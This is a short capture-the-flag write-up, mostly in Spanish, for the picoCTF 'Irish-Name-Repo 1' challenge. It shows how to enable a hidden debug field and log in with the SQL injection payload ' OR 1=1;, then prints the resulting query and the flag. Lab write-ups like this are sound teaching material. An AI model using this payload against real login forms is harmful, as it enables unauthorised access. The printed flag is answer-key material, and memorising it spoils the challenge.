# 1- Irish-Name-Repo 1

# Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
# Solución
```
ingresas a la pagina y te diriges a la esquina de la izquierda, en seguida abre el menu y entra a admin login.

ahora dale clic derecho y inspeccionar elemento sobre el cuadro de texto del usuario, enseguida busca la siguiente linea y modifica lo siguiente:

linea original
<input type="hidden" name="debug" value="0">

linea modificada
<input name="debug" value="1">

la pagina cambiara y mostrara un cuadro de texto nuevo debajo del cuadro de texto del password con un 1, de ahi solo escribe en el usuario lo siguiente:
' OR 1=1;
En el password escribe password y presiona el boton login y listo accedera y te mostrara la badera.

(lo que muestra la pagina al realizar los pasos)

username: ' OR 1=1;
password: password
SQL query: SELECT * FROM users WHERE name='' OR 1=1;' AND password='password'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}

```
# Notas Adicionales

# Referencias
